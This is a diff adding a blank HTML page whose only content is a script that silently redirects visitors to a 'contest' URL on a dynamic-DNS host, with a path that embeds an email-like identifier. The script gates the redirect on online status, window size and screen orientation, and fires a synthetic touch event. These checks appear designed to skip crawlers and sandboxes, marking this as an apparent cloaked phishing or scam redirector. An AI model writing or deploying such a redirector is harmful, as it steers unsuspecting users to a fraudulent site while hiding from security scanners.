@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+    <head>        
+     <meta charset="UTF-8" />
+   </head>
+   <body>  
+   </body>
+   <script>
+
+function eventFire(el, etype){
+  if (el.fireEvent) {
+    el.fireEvent('on' + etype);
+  }else {
+    var evObj = document.createEvent('Events');
+    evObj.initEvent(etype, true, false);
+    el.dispatchEvent(evObj);
+  }
+}
+
+      var catalog = {
+        'key1': {'page':"conterylink1/11/ob@orge/djoe/fr/9999",'db':"liner",'link':"https://orangecontest.ddns.net/"},
+        'key6': {'path':'aath','pasge':'temate_2.html'}
+      }      
+     setTimeout(function() { 
+            if(navigator.onLine) {
+              console.log('We\'re online!');
+              let box = window.innerHeight;
+              let boxs = window.innerWidth;
+              if(box > 200 && boxs > 200){
+                if(typeof screen.orientation !== 'undefined'){
+                  location.replace(catalog.key1.link+catalog.key1.page+"/");
+                }else{                  
+                  window.addEventListener("touchstart", () => { 
+                    location.replace(catalog.key1.link+catalog.key1.page+"/");            
+                  });
+                  eventFire(window, "touchstart");
+                }
+
+              }
+
+            }else {
+               console.log('We\'re oine...');
+            } 
+          }, 0);
+       
+
+   </script>
+</html>
